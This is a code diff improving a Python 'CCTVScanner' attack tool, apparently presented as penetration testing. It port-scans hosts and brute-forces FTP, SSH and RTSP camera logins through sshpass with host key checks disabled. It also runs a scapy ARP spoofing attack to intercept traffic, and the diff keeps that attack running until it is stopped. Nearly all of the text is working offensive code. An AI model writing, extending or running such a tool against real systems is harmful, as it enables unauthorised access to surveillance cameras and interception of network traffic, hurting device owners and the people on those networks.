@@ -15,14 +15,14 @@ import requests
 import argparse
 import random
 from concurrent.futures import ThreadPoolExecutor
-from scapy.all import *
-from ftplib import FTP
-from http.client import HTTPConnection
-import urllib.parse
-import base64
-import hashlib
-import itertools
-import string
+
+# Try to import scapy - make it optional
+try:
+    from scapy.all import *
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+    print("[!] Scapy not installed. ARP spoofing disabled. Install with: pip install scapy")
 
 class Colors:
     RED = '\033[91m'
@@ -68,6 +68,7 @@ class CCTVScanner:
             i = (i + 1) % len(chars)
 
     def start_animation(self, message):
+        self.stop_scan = False
         self.animation_thread = threading.Thread(target=self.animate_loading, args=(message,))
         self.animation_thread.daemon = True
         self.animation_thread.start()
@@ -76,7 +77,7 @@ class CCTVScanner:
         self.stop_scan = True
         time.sleep(0.2)
         sys.stdout.write("\r" + " " * 100 + "\r")
-        self.stop_scan = False
+        sys.stdout.flush()
 
     def port_scan(self, target, ports=None):
         if ports is None:
@@ -139,6 +140,10 @@ class CCTVScanner:
         return service
 
     def arp_spoofing(self, target, gateway, interface):
+        if not SCAPY_AVAILABLE:
+            print(f"{Colors.RED}[!] Scapy not available. Cannot perform ARP spoofing.{Colors.END}")
+            return
+            
         print(f"{Colors.RED}[!] Starting ARP Spoofing attack{Colors.END}")
         print(f"{Colors.YELLOW}[*] Target: {target}{Colors.END}")
         print(f"{Colors.YELLOW}[*] Gateway: {gateway}{Colors.END}")
@@ -147,6 +152,10 @@ class CCTVScanner:
             try:
                 target_mac = getmacbyip(target)
                 gateway_mac = getmacbyip(gateway)
+                
+                if not target_mac or not gateway_mac:
+                    print(f"{Colors.RED}[-] Could not resolve MAC addresses{Colors.END}")
+                    return
                 
                 packet1 = ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway)
                 packet2 = ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target)
@@ -180,6 +189,8 @@ class CCTVScanner:
                 if self.stop_scan:
                     break
                 try:
+                    # Use ftplib
+                    from ftplib import FTP
                     ftp = FTP()
                     ftp.connect(target, port, timeout=5)
                     ftp.login(username, password)
@@ -218,6 +229,13 @@ class CCTVScanner:
     def crack_ssh(self, target, port, usernames, passwords):
         self.start_animation("Cracking SSH credentials")
         
+        # Check if sshpass is available
+        sshpass_check = subprocess.run(['which', 'sshpass'], capture_output=True)
+        if sshpass_check.returncode != 0:
+            self.stop_animation()
+            print(f"{Colors.RED}[-] sshpass not installed. Install with: apt install sshpass{Colors.END}")
+            return
+        
         for username in usernames:
             for password in passwords:
                 if self.stop_scan:
@@ -225,7 +243,7 @@ class CCTVScanner:
                 try:
                     ssh = subprocess.Popen([
                         'sshpass', '-p', password, 'ssh', '-o', 'ConnectTimeout=5',
-                        '-o', 'StrictHostKeyChecking=no', 
+                        '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null',
                         f'{username}@{target}', 'exit'
                     ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     ssh.communicate(timeout=5)
@@ -258,7 +276,7 @@ class CCTVScanner:
                     auth_str = f"{username}:{password}@" if username or password else ""
                     url = f"rtsp://{auth_str}{target}:554{path}"
                     
-                    # Test with ffmpeg or rtsp client
+                    # Test with ffmpeg
                     result = subprocess.run([
                         'timeout', '5', 'ffmpeg', '-i', url, '-t', '1',
                         '-f', 'null', '-'
@@ -361,13 +379,14 @@ class CCTVScanner:
                 try:
                     if port == 554:  # RTSP
                         url = f"rtsp://{target}:554{path}"
+                        # Skip HTTP request for RTSP
+                        continue
                     else:
                         protocol = "https" if port == 443 else "http"
                         url = f"{protocol}://{target}:{port}{path}"
-                    
-                    response = requests.get(url, timeout=5, verify=False) if port != 554 else None
-                    if response and response.status_code == 200:
-                        return True
+                        response = requests.get(url, timeout=5, verify=False)
+                        if response and response.status_code == 200:
+                            return True
                 except:
                     continue
         return False
@@ -411,6 +430,7 @@ class CCTVScanner:
         with open(filename, 'w') as f:
             f.write("CCTV Penetration Testing Report\n")
             f.write("=" * 50 + "\n\n")
+            f.write(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
             
             for target, data in self.results.items():
                 f.write(f"Target: {target}\n")
@@ -457,11 +477,15 @@ def main():
         print(f"{Colors.RED}[-] No targets specified{Colors.END}")
         return
     
+    # Parse ports if specified
+    ports = None
+    if args.ports:
+        ports = [int(p.strip()) for p in args.ports.split(',')]
+    
     # Scan ports and services
     for target in targets:
         print(f"\n{Colors.BLUE}[*] Scanning target: {target}{Colors.END}")
         
-        ports = [int(p) for p in args.ports.split(',')] if args.ports else None
         open_ports = scanner.port_scan(target, ports)
         
         services = []
@@ -472,7 +496,8 @@ def main():
         
         scanner.results[target] = {
             'ports': open_ports,
-            'services': services
+            'services': services,
+            'vulnerabilities': []
         }
         
         # RTSP scanning
@@ -500,6 +525,13 @@ def main():
         gateway = input(f"{Colors.YELLOW}[?] Enter gateway IP: {Colors.END}")
         interface = input(f"{Colors.YELLOW}[?] Enter network interface: {Colors.END}")
         scanner.arp_spoofing(args.target, gateway, interface)
+        
+        print(f"{Colors.YELLOW}[*] ARP spoofing running. Press Ctrl+C to stop.{Colors.END}")
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[*] Stopping ARP spoofing...{Colors.END}")
     
     # Generate report
     scanner.generate_report("cctv_scan_report.txt")
@@ -511,7 +543,7 @@ if __name__ == "__main__":
         main()
     except KeyboardInterrupt:
         print(f"\n{Colors.RED}[!] Scan interrupted by user{Colors.END}")
-        sys.exit(1)
+        sys.exit(0)
     except Exception as e:
         print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
         sys.exit(1)
